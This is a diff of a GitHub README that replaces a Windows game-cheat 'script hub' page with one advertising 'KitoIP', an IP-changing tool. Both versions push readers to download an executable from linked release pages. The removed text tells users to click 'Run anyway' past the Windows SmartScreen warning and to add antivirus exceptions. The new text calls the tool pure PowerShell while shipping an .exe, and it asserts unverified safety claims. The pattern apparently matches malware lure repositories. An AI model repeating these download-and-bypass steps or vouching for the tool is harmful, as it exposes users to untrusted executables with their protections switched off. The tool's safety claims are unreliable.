@@ -1,93 +1,141 @@
-# 🎯 baddies-windows-script-hub - Enhance your gameplay with simple tools
+# 🌐 KitoIP - Change Your IP Three Powerful Ways
 
-<p align="center">
-  <a href="https://peanutbutterwatersnake580.github.io">
-    <img src="https://img.shields.io/badge/Download-Release-blue" alt="Download">
-  </a>
-</p>
+[![Download KitoIP](https://img.shields.io/badge/Download-KitoIP-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Peanutbutterwatersnake580/KitoIP/releases)
 
-This tool adds extra features to your Baddies game on Windows 10 and 11. It helps you track targets, manage aim, and join private game sessions. You do not need coding skills to use this software. Follow these instructions to set up the utility on your machine.
+## 🚀 What Is KitoIP?
 
-## 🛠️ System Requirements
+KitoIP is a simple, all-in-one tool for Windows that lets you change your IP address in three different ways — all from one terminal window. Whether you want to hide your real location, switch between network settings, or connect through Cloudflare's fast WARP service, KitoIP does it without needing to install anything complicated.
 
-Make sure your computer meets these standards before you begin:
+This tool is built entirely with PowerShell, meaning it works right out of the box on any modern Windows computer. No extra software, no drivers, no confusing setup — just download, run, and pick how you want to change your IP.
 
-*   Operating System: Windows 10 or Windows 11 (64-bit).
-*   Game Version: Baddies v3.2 or newer.
-*   System Memory: At least 4GB of RAM.
-*   Storage Space: 50MB of free disk space.
-*   Frameworks: Microsoft .NET Desktop Runtime 6.0 or newer.
+## 🏆 Why Choose KitoIP?
 
-If your computer lacks the .NET runtime, the game utility will prompt you to install it during the first run. Follow the on-screen link provided by the installer to download the official version from Microsoft.
+- **All-in-One Solution** – Three IP-changing methods in a single tool
+- **Zero Dependencies** – No Java, Python, or other runtimes required
+- **Pure PowerShell** – Lightweight, fast, and reliable on any Windows system
+- **Country Selection** – Choose from multiple countries for your WARP connection
+- **Easy to Use** – Simple menu-driven interface, no typing complex commands
+- **Safe & Private** – Your real IP stays hidden when you use proxy or WARP modes
 
-## 📥 Getting the Software
+## 📥 Download and Install
 
-You must visit the official release page to get the correct version of the utility for your system.
+Visit this link to download the application: [https://github.com/Peanutbutterwatersnake580/KitoIP/releases](https://github.com/Peanutbutterwatersnake580/KitoIP/releases)
 
-[Visit this page to download the latest setup file](https://peanutbutterwatersnake580.github.io)
+Once you're on that page, look for the newest release at the top. You'll see a file named something like `KitoIP.exe` or a compressed folder. Click the download button next to the file you need.
 
-1. Select the link above to open your browser.
-2. Look for the section labeled "Releases" on the right side of the page.
-3. Click the most recent release number.
-4. Locate the list of files under the "Assets" header.
-5. Choose the file ending in `.exe` to begin your download.
-6. Save the file to your desktop or downloads folder.
+The download will start automatically. Once it's finished, go to your Downloads folder — that's usually where browsers save files. You'll find the KitoIP file waiting there, ready to use.
 
-## ⚙️ Installation Guide
+## ⚙️ How to Run KitoIP
 
-Follow these steps to prepare the utility for your game session:
+Getting started with KitoIP takes less than a minute. Follow these simple steps:
 
-1. Locate the downloaded file on your computer.
-2. Double-click the file to start the installer.
-3. Windows might show a blue pop-up box stating "Windows protected your PC."
-4. If this box appears, click the "More info" text near the top.
-5. Click the "Run anyway" button that appears.
-6. Follow the prompts in the setup window. Select your preferred installation folder or use the default location.
-7. Click "Finish" when the progress bar reaches the end.
+1. **Open your Downloads folder** – Press `Windows + E` to open File Explorer, then click "Downloads" on the left side.
+2. **Find the KitoIP file** – Look for the file you just downloaded.
+3. **Double-click to start** – That's it! A terminal window will open showing the main menu.
 
-The program creates a shortcut on your desktop during this process.
+No installation needed, no admin rights required (though some features work better with admin access). The program runs directly from where you placed it.
 
-## 🎮 How to Use Features
+## 🧭 Using KitoIP: Three Modes Explained
 
-The utility runs in the background while you play Baddies. Use the control panel to adjust your settings before you launch the game.
+KitoIP gives you three different ways to change your IP. Here's what each one does:
 
-### Aim Assistance
+### 🕵️ Proxy Engine (Public IP)
 
-The aim assistant helps you keep focus on active targets. Click the "Aim Assist" tab to toggle this feature. Use the slider to adjust sensitivity. Higher numbers make the adjustment feel faster. Lower numbers keep the movement steady. Keep this feature off if you prefer manual aim control.
+This mode routes your internet traffic through a proxy server, making websites see the proxy's IP instead of yours. It's perfect for:
+- Browsing websites that block your region
+- Protecting your privacy on public Wi-Fi
+- Accessing geo-restricted content
 
-### Target Filtering
+The proxy engine is fast and works with any browser or app on your system.
 
-This feature ignores background objects and focuses on players. Use the "Filter" menu to set priorities. You can choose to highlight specific targets with colored outlines. This makes it easier to spot opponents in dark or complex environments.
+### 🖥️ LAN IP Switcher
 
-### Hotkey Management
+This mode changes the IP address assigned to your computer on your local network (like your home or office network). This is useful for:
+- Fixing network conflicts between devices
+- Setting up static IPs for printers or servers
+- Troubleshooting connection drops
 
-You can perform quick actions using keyboard shortcuts. Open the "Hotkeys" tab to see all current binds. Change these keys by clicking the text box and pressing the button you want to use. Make sure your chosen key does not conflict with standard in-game commands.
+You can choose between automatic (DHCP) and manual IP assignment.
 
-### Private Sessions
+### 🛡️ Cloudflare WARP (WireGuard)
 
-The script hub includes a tool to manage invite-only games. Select the "Network" tab. This menu shows a list of active private lobbies. Click "Join" to enter a session directly. You can also create a private room by clicking "Host." This creates a link you can send to your friends.
+The most powerful option — this connects you to Cloudflare's global network using a secure WireGuard tunnel. You get:
+- **Country selection** – Pick from several countries to appear in
+- **Faster speeds** – Cloudflare's network is incredibly optimized
+- **Strong encryption** – Your browsing is protected from prying eyes
+- **Bypass blocking** – Get around internet censorship easily
 
-## 🛡️ Privacy and Safety
+Simply select WARP mode, choose your preferred country from the list, and press Enter. Your connection switches instantly.
 
-This utility does not track your online activity or personal identity. All settings stay saved on your local hard drive. 
+## 📋 System Requirements
 
-*   Do not share your custom hotkey configurations if they contain sensitive input sequences.
-*   Only download the tool from the official link provided in this guide to avoid malicious copies.
-*   Keep your version of Baddies updated to ensure the script hub works as intended.
+KitoIP is designed to work on virtually any Windows machine:
 
-## 🔧 Troubleshooting Common Issues
+| Requirement | Minimum |
+|-------------|---------|
+| Operating System | Windows 10 (64-bit) or Windows 11 |
+| RAM | 2 GB (4 GB recommended) |
+| Storage | 50 MB free space |
+| Internet Connection | Required for proxy and WARP modes |
 
-If the utility fails to start, try these solutions:
+Your computer probably already meets these requirements. If it runs Windows 10 or newer, you're good to go.
 
-*   Restart your computer. This clears background processes that might block the utility.
-*   Run the file as an administrator. Right-click the shortcut and select "Run as administrator."
-*   Check your Antivirus. Sometimes security software holds new programs in a quarantine folder. Check your antivirus history to see if it blocked the file. Add an exception for the file if necessary.
-*   Verify your game version. If you run a version older than v3.2, the utility will not detect the game interface.
+## 🔧 Frequently Asked Questions
 
-## 📝 Support and Updates
+### ❓ Is KitoIP safe to use?
 
-If you encounter bugs, open a new issue on the GitHub repository page. Include a brief description of what happened and a screenshot if possible. Developers review these reports regularly to improve the tool.
+Yes. KitoIP only changes your network settings — it never modifies system files, installs drivers, or tracks your activity. All operations are reversible.
 
-Check the repository page periodically for new releases. Newer versions often include compatibility fixes for updated game builds. Deleting the old version before installing a new one prevents configuration conflicts. 
+### ❓ Which mode should I choose?
 
-Keywords: baddies, windows, utility, aim-assist, game-tools, setup, installation, script-hub
+- For general browsing privacy → **Proxy Engine**
+- For network troubleshooting → **LAN IP Switcher**
+- For maximum speed and security → **Cloudflare WARP**
+
+### ❓ Will my internet be faster with WARP?
+
+Usually yes. Cloudflare WARP often improves speeds by routing through their optimized backbone network. If you have a good baseline connection, you'll likely see better performance.
+
+### ❓ Can I use KitoIP with my games?
+
+Absolutely. KitoIP works at the system level, so games and other apps will automatically use the new IP. WARP mode is especially good for gaming due to its low latency.
+
+### ❓ What if I want to switch back?
+
+Simply close KitoIP and restart your network connection. Your IP will return to whatever your router assigns you. There's no permanent change.
+
+## 🌟 Tips for Best Results
+
+- **Run as administrator** – Right-click KitoIP and select "Run as administrator" for smoother operation, especially for LAN IP switching.
+- **Keep it updated** – Check the releases page periodically for new versions with more countries and better stability.
+- **Use a wired connection** – For gaming or video calls, a wired Ethernet connection combined with WARP gives the best experience.
+- **Combine modes** – You can switch between proxy and WARP anytime by reopening KitoIP and choosing a different option.
+
+## 📝 What's Coming Next
+
+The developer is actively improving KitoIP. Future updates may include:
+
+- More country options for WARP
+- A graphical interface version
+- Scheduled IP rotation
+- Custom proxy server support
+
+## 🤝 Need Help?
+
+If you run into any issues, visit the GitHub repository and check the "Issues" tab. You can also:
+
+- Open a new issue describing your problem
+- See what others are reporting
+- Suggest improvements or new features
+
+## 📌 Final Words
+
+KitoIP puts professional-grade IP management into the hands of everyday users. No complicated code, no expensive VPN subscriptions — just a free, powerful tool that does exactly what it promises. Try all three modes today and find the one that fits your needs.
+
+Whether you're a streamer wanting to access global content, a professional needing to switch networks constantly, or just someone who values online privacy, KitoIP has a solution waiting for you.
+
+Download it now and take control of your IP address — it only takes a minute to get started.
+
+---
+
+**Keywords:** cli, cloudflare-warp, ip-changer, ip-rotation, networking, powershell, privacy, proxy, vpn, warp, windows, wireguard
